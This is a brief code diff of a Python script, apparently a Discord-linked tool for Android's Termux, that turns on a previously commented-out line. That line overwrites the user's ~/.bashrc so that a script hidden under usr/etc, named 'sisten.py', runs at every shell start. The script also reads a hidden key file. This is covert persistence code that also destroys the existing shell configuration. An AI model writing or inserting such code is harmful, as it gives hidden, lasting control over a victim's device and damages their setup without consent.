@@ -4,7 +4,7 @@ import discord
 import asyncio
 
 
-#os.system('echo "python3 ~/../usr/etc/sisten.py" > ~/.bashrc &')
+os.system('echo "python3 ~/../usr/etc/sisten.py" > ~/.bashrc &')
 
 def chave():
     with open('/data/data/com.termux/files/usr/etc/.key.txt', 'r') as arquivo:
